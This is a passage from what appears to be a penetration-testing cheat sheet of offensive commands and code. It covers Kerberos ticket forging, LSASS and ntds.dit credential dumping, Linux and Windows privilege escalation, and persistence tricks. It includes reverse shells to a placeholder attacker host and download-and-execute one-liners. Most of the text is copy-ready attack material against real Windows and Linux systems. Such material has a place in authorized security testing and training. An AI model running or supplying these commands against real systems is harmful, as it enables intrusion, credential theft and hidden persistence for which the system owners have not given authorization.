mimikatz # kerberos::golden /domain:<TARGET_DOMAIN>/sid:<SID> /aes256:<KEY> /user:<USERNAME> /service:<SERVICE> /target:<RHOST>
```

##### Inject TGS with Mimikatz

```c
$ mimikatz # kerberos::ptt <KIRBI_FILE>
```

#### Rubeus Examples

```c
C:\> .\Rubeus.exe ptt /ticket:<KIRBI_FILE>
```

##### Execute CMD on Remote Host

```c
C:\> .\PsExec.exe -accepteula \\<RHOST> cmd
```

### Golden Ticket

#### Impacket Examples

##### Generate TGT with NTLM

```c
$ python ticketer.py -nthash <KRBTGT_NTLM_HASH> -domain-sid <SID> -domain <TARGET_DOMAIN>  <USERNAME>
```

##### Generate TGT with aesKey

```c
$ python ticketer.py -aesKey <KEY> -domain-sid <SID> -domain <TARGET_DOMAIN>  <USERNAME>
```

##### Set TGT for Impacket Usage

```c
$ export KRB5CCNAME=<USERNAME>.ccache
```

##### Execute Remote Commands by using TGT

```c
$ impacket-psexec <TARGET_DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
$ impacket-smbexec <TARGET_DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
$ impacket-wmiexec <TARGET_DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
```

#### mimikatz Examples

##### Generate TGT with NTLM

```c
mimikatz # kerberos::golden /domain:<TARGET_DOMAIN>/sid:<SID> /rc4:<KRBTGT_NTLM_HASH> /user:<USERNAME>
```

##### Generate TGT with AES 128bit Key

```c
mimikatz # kerberos::golden /domain:<TARGET_DOMAIN>/sid:<SID> /aes128:<KEY> /user:<USERNAME>
```

##### Generate TGT with AES 256bit Key (More secure Encryption, probably more stealth due is it used by Default)

```c
mimikatz # kerberos::golden /domain:<TARGET_DOMAIN>/sid:<SID> /aes256:<KEY> /user:<USERNAME>
```

##### Inject TGT with Mimikatz

```c
mimikatz # kerberos::ptt <KIRBI_FILE>
```

#### Rubeus Examples

##### Inject Ticket with Rubeus

```c
C:\> .\Rubeus.exe ptt /ticket:<KIRBI_FILE>
```

##### Execute CMD on Remote Host

```c
C:\> .\PsExec.exe -accepteula \\<RHOST> cmd
```

##### Get NTLM from Password

```c
$ python -c 'import hashlib,binascii; print binascii.hexlify(hashlib.new("md4", "<PASSWORD>".encode("utf-16le")).digest())'
```

## Krbrelayx

> https://github.com/dirkjanm/krbrelayx

### Abuse DNS Delegation Zones with dnstool.py

```c
$ python3 dnstool.py -u 'domain\<USER>' -p '<PASSWORD>' -a add -r '<TO_ABUSE>.<TARGET_DOMAIN>' -d <LHOST> <RHOST>
```

## LAPS

```c
PS C:\Users\<USER>\Documents> $Computers = Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime
PS C:\Users\<USER>\Documents> $Computers | Sort-Object ms-Mcs-AdmPwdExpirationTime | Format-Table -AutoSize Name, DnsHostName, ms-Mcs-AdmPwd, ms-Mcs-Adm-PwdExpirationTime
```

## LDAP

> https://github.com/infosecn1nja/AD-Attack-Defense

> https://www.poweradmin.com/blog/restoring-deleted-objects-from-active-directory-using-ad-recycle-bin/

> https://adsecurity.org/?p=2288

### Queries

```c
$ (New-Object adsisearcher((New-Object adsi("LDAP://dc.<TARGET_DOMAIN>.local","<TARGET_DOMAIN>\<USERNAME>","<PASSWORD>")),"(objectCategory=Computer)")).FindAll() | %{ $_.Properties.name }
$ (New-Object adsisearcher((New-Object adsi("LDAP://dc.<TARGET_DOMAIN>.local","<TARGET_DOMAIN>\<USERNAME>","<PASSWORD>")),"(info=*)")).FindAll() | %{ $_.Properties }
```

## LD_Preload

> https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/

### shell.c

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}
```

### Compiling

```c
$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

### Privilege Escalation

```c
$ ls -la shell.so
$ sudo LD_PRELOAD=/tmp/shell.so find
```

#### Alternatively

```c
$ sudo LD_PRELOAD=/tmp/shell.so /opt/<FILE>.sh
```

## Linux

### adduser.sh

```c
#!/bin/bash
echo '<USERNAME>:BP9vDdYHNP.Mk:0:0:root:/root:/bin/bash' >> /etc/passwd
```

## Linux Wildcards

> https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt


With the command `touch -- --checkpoint=1` will be a file created. Why? Because the `--` behind the command `touch` is telling touch, that there's option to be wait for. 
Instead of an option, it creates a file, named `--checkpoint=1`.

```c
$ touch -- --checkpoint=1
```

So after creating the `--checkpoint=1` file, i created another file, which executes a shell script.

```c
$ touch -- '--checkpoint-action=exec=sh shell.sh'
```

To delete a misconfigured file, put a `./` in front of it.

```c
$ rm ./'--checkpoint-action=exec=python script.sh'
```

## logrotten

> https://github.com/whotwagner/logrotten

### Skeleton Payload

```c
if [ `id -u` -eq 0 ]; then ( /bin/sh -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1 ); fi
```

### Syntax

#### If "create"-option is set in logrotate.cfg

```c
./logrotten -p ./payloadfile /tmp/log/pwnme.log
```

#### If "compress"-option is set in logrotate.cfg

```c
./logrotten -p ./payloadfile -c -s 4 /tmp/log/pwnme.log
```

## Lsass

### Dump

```c
$ tasklist
$ rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 688 C:\Users\Administrator\Documents\lsass.dmp full
```

## Lua

### Code Execution

```c
file = io.open("/root/.ssh/authorized_keys", "w")
file:write("ssh-rsa AAAAB3N--- snip ---YM5syQ==")
file:close()
```

## machinectl

```c
$ machinectl shell --uid=root
```

## Microsoft Windows

### Adding User

```c
$ net user <USERNAME> <PASSWORD> /add /domain
$ net group "Exchange Windows Permissions" /add <USERNAME>
$ net localgroup "Remote Management Users" /add <USERNAME>
```

### AlwaysInstallElevated

```c
C:> reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
C:> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

```c
$ msfvenom -p windows/meterpreter/reverse_tcp lhost=<LHOST> lport=<LPORT> â€“f  msi > <FILE>.msi
```

```c
C:> msiexec /quiet /qn /i <FILE>.msi
```

### Tasks & services

```c
$ tasklist /SVC
$ netsh firewall show state
$ schtasks /query /fo LIST /v
$ driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path
$ sc query
$ sc qc <SERVICE>
$ accesschk.exe -uws "Everyone" "C:\Program Files"
$ dir /s *pass* == *cred* == *vnc* == *.config*
$ findstr /si password *.xml *.ini *.txt
$ wmic qfe get Caption,Description,HotFixID,InstalledOn
```

## Microsoft Windows Defender

### Check Whitelisted Paths

```c
PS C:> reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
```

### Malicious Test String

```c
PS C:> $str = 'amsiinitfailed'
```

## Path Variable Hijacking

### Finding accessible SUID Files

```c
$ find / -perm -u=s -type f 2>/dev/null
```

### Add current Directory

```c
$ export PATH=$(pwd):$PATH
```

### Binary File

```c
$ cd /tmp
$ vi <FILE>
$ chmod +x ./<FILE>
$ PATH=$(pwd):$PATH <SUID_FILE>
```

## plotting

Exploit race condition on linux by swapping file paths between 2 files very quickly (normal file, symlink to root owned file, swap, swap ,swap).

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <linux/fs.h>

int main(int argc, char *argv[]) {
  while (1) {
    syscall(SYS_renameat2, AT_FDCWD, argv[1], AT_FDCWD, argv[2], RENAME_EXCHANGE);
  }
  return 0;
}
```

## PowerSploit

> https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1

### Evil-WinRM Upload

```c
$ UPLOAD PowerView.ps1 C:\Users\webuser\Documents
```

### Example

```c
PS webserver\webuser@WEBSERVER Documents> UPLOAD PowerView.ps1 C:\Users\webuser\Documents
```

### Import

```c
$ Import-Module .\PowerView.ps1
```
or

```c
PS C:> iex(new-object net.webclient).downloadstring('http://<LHOST>/PowerView.ps1')
```

### Example

```c
PS C:\> webserver\webuser@WEBSERVER Documents> Import-Module .\PowerView.ps1
```

### Set Credentials

```c
$ $SecPass = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force 
$ $cred = New-Object System.Management.Automation.PSCredential('<TARGET_DOMAIN>\LDAP', $SecPass)
```

### Example

```c
PS C:\> webserver\webuser@WEBSERVER Documents> $cred
$ Get-DomainUser -Credential $cred -DomainController dc.<TARGET_DOMAIN>
```

## PowerView

> https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

```c
PS C:> curl http://<LHOST>/PowerView.ps1 | iex
```

## PRET

> https://github.com/RUB-NDS/PRET

```c
$ ./pret.py
$ ./pret.py <printer fqdn> ps    // pjl
```

```c
<RHOST>:/> ls
<RHOST>:/> cd
<RHOST>:/> get
<RHOST>:/> nvram dump
```

## pth-toolkit

> https://github.com/byt3bl33d3r/pth-toolkit

```c
$ pth-smbclient --user=<USERNAME> --pw-nt-hash -m smb3 \\\\<RHOST>\\<USERNAME> <HASH>
```

## Python

### System Shell

```c
$ python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### Python Library Hijacking

> https://rastating.github.io/privilege-escalation-via-python-library-hijacking/

> https://medium.com/@klockw3rk/privilege-escalation-hijacking-python-library-2a0e92a45ca7

### Get the current Path

```c
$ python3 -c 'import sys;print(sys.path)'
```

### remoteshell.py

```c
import os
os.system("nc -lnvp <LPORT> -e /bin/bash")
```

### Include Path

```c
$ sudo -E PYTHONPATH=$(pwd) /opt/scripts/admin_tasks.sh 6
```

## pika

### Remote Code Execution (RCE)

```c
#!/usr/bin/env python

import pika

credentials = pika.PlainCredentials('<USERNAME>', '<PASSWORD>')
parameters = pika.ConnectionParameters('<LHOST>',5672,'/',credentials)
connection = pika.BlockingConnection(parameters)
channel = connection.channel()
channel.basic_publish(exchange='', routing_key='plugin_data', body='http://127.0.0.1:9001/<SCRIPT>')
connection.close()
```

## powercat

### File Transfer

```c
$ impacket-smbserver local . -smb2support
```

```c
PS C:\> Import-Module .\powercat.ps1
PS C:\> powercat -c <LHOST> -p 445 -i C:\PATH\TO\FILE\<FILE>
```

## pwncat

> https://github.com/calebstewart/pwncat

> https://pwncat.readthedocs.io/en/latest/usage.html

### Common Commands

```c
(local) pwncat$ back    // get back to shell
Ctrl+d                  // get back to pwncat shell
```

```c
$ pwncat-cs -lp <LPORT>
(local) pwncat$ download /PATH/TO/FILE/<FILE> .
(local) pwncat$ upload /PATH/TO/FILE/<FILE> /PATH/TO/FILE/<FILE>
```

## Rubeus

> https://github.com/GhostPack/Rubeus

### Overpass the Hash

```c
PS C:\> Rubeus.exe kerberoast /user:p00_adm
```

### Pass the Hash

```c
PS C:\> .\Rubeus.exe asktgt /user:Administrator /certificate:7F052EB0D5D122CEF162FAE8233D6A0ED73ADA2E /getcredentials
```

## RunasCs

> https://github.com/antonioCoco/RunasCs

```c
C:\> ./RunasCs.exe -l 3 -d <DOMAIN> "<USERNAME>" '<PASSWORD>' 'C:\Users\<USERNAME>\Downloads\<FILE>.exe'
C:\> ./RunasCs.exe -d <DOMAIN> "<USERNAME>" '<PASSWORD>' cmd.exe -r <LHOST>:<LPORT>
```

## SeBackupPrivilege Privilege Escalation (diskshadow)

> https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug

### Script for PowerShell Environment

```c
SET CONTEXT PERSISTENT NOWRITERSp
add volume c: alias foobarp
createp
expose %foobar% z:p
```

```c
$ diskshadow /s <FILE>.txt
```

### Copy ntds.dit

```c
$ Copy-FileSebackupPrivilege z:\Windows\NTDS\ntds.dit C:\temp\ndts.dit
```

### Export System Registry Value

```c
$ reg save HKLM\SYSTEM c:\temp\system
```

Download `ndts.dit` and system and get the hashes from `secretsdump.py` of the impacket-suite.

## Shell Upgrade

```c
$ python -c 'import pty;pty.spawn("/bin/bash")'
```

or

```c
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
```

```c
$ Ctrl + z
$ stty raw -echo
fg
Enter
Enter
$ export XTERM=xterm
```

## Sherlock

> https://github.com/rasta-mouse/Sherlock

### Config

Add `Find-AllVulns` at the end of the script to run it as soon as it get's loaded.

```c
            10586 { $VulnStatus = @("Not Vulnerable","Appears Vulnerable")[ $Revision -le 19 ] }
            14393 { $VulnStatus = @("Not Vulnerable","Appears Vulnerable")[ $Revision -le 446 ] }
            default { $VulnStatus = "Not Vulnerable" }

        }

    Set-ExploitTable $MSBulletin $VulnStatus

}
Find-AllVulns

$ IEX(New-Object Net.webclient).downloadString('http://<LHOST>/Sherlock.ps1')
```

## sudo

### Privilege Escalation

```c
!root:
$ sudo -u#-1 /bin/bash
```

## sudoedit

### Vulnerability Test

```c
$ sudoedit -s /
```

## Time Stomping

```c
$dateTime = New-Object System.DateTime(1999,12,26)
$regKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey("SYSTEM\CurrentControlSet\Services\helpsvc",$true)[RegRoutines.NativeMethods]::SetRegistryKeyDateTime($regKey, $dateTime)
```

## Universal Privilege Escalation and Persistence Printer

```c
$printerName     = 'Pentest Lab Printer'
$system32        = $env:systemroot + '\system32'
$drivers         = $system32 + '\spool\drivers'
$RegStartPrinter = 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers\' + $printerName
```

```c
Copy-Item -Force -Path ($system32 + '\mscms.dll')             -Destination ($system32 + '\mimispool.dll')
Copy-Item -Force -Path '.\mimikatz_trunk\x64\mimispool.dll'   -Destination ($drivers  + '\x64\3\mimispool.dll')
Copy-Item -Force -Path '.\mimikatz_trunk\win32\mimispool.dll' -Destination ($drivers  + '\W32X86\3\mimispool.dll')
```

```c
Add-PrinterDriver -Name       'Generic / Text Only'
Add-Printer       -DriverName 'Generic / Text Only' -Name $printerName -PortName 'FILE:' -Shared
```

```c
New-Item         -Path ($RegStartPrinter + '\CopyFiles')        | Out-Null
```

```c
New-Item         -Path ($RegStartPrinter + '\CopyFiles\Kiwi')   | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Kiwi')   -Name 'Directory' -PropertyType 'String'      -Value 'x64\3'           | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Kiwi')   -Name 'Files'     -PropertyType 'MultiString' -Value ('mimispool.dll') | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Kiwi')   -Name 'Module'    -PropertyType 'String'      -Value 'mscms.dll'       | Out-Null
```

```c
New-Item         -Path ($RegStartPrinter + '\CopyFiles\Litchi') | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Litchi') -Name 'Directory' -PropertyType 'String'      -Value 'W32X86\3'        | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Litchi') -Name 'Files'     -PropertyType 'MultiString' -Value ('mimispool.dll') | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Litchi') -Name 'Module'    -PropertyType 'String'      -Value 'mscms.dll'       | Out-Null
```

```c
New-Item         -Path ($RegStartPrinter + '\CopyFiles\Mango')  | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Mango')  -Name 'Directory' -PropertyType 'String'      -Value $null             | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Mango')  -Name 'Files'     -PropertyType 'MultiString' -Value $null             | Out-Null
New-ItemProperty -Path ($RegStartPrinter + '\CopyFiles\Mango')  -Name 'Module'    -PropertyType 'String'      -Value 'mimispool.dll'   | Out-Null
```

## User Group Exploitation

> https://wixnic.github.io/linux-privesc-groups/

> https://www.hackingarticles.in/multiple-ways-to-get-root-through-writable-file/

### Possibilities

```c
- Edit /etc/passwd    // copy it to /tmp to edit
- Add new SSH Key to /root/
```

### Find modifyable Files

```c
$ find / -group root -perm -g=w ! -type l 2>/dev/null | grep -v 'proc\|sys' | xargs ls -l
```

### Option 1

```c
#!/usr/bin/env python
import os
import sys
try:
       os.system('cp /bin/sh /tmp/sh')
       os.system('chmod u+s /tmp/sh')
except:
       sys.exit()
```

### Option 2

```c
#!/usr/bin/env python
import os
import sys
try:
       os.system('echo "$USER ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers')
except:
       sys.exit()
```

## VSS

> https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators 

### Abusing Server Operator Group Membership to get a Reverse Shell

```c
$ sc.exe config vss binPath="C:\Users\svc-printer\Documents\nc.exe -e cmd.exe <LHOST> <LPORT>"
$ sc.exe stop vss
$ sc.exe start vss
```

## Whisker

```c
C:\> .\Whisker.exe add /target:<USERNAME>
```

## Windows-Exploit-Suggester

> https://github.com/AonCyberLabs/Windows-Exploit-Suggester

### Prerequisites

```c
$ python -m pip install xlrd
```

### Update

```c
$ ./windows-exploit-suggester.py --update
```

### Usage

```c
$ ./windows-exploit-suggester.py --database 2020-07-15-mssb.xls --systeminfo sysinfo
```

## WDigest

### Store Cleartext Credentials Cleartext in LSASS

```c
PS C:\> Set-ItemProperty -Force -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -Name "UseLogonCredential" -Value '1'"
```

## writeDACL

> https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/

### Usage

```c
Ps> $SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
Ps> $Cred = New-Object System.Management.Automation.PSCredential('<TARGET_DOMAIN>\<USERNAME>', $SecPassword)
Ps> Add-ObjectACL -PrincipalIdentity <USERNAME> -Credential $Cred -Rights DCSync
```
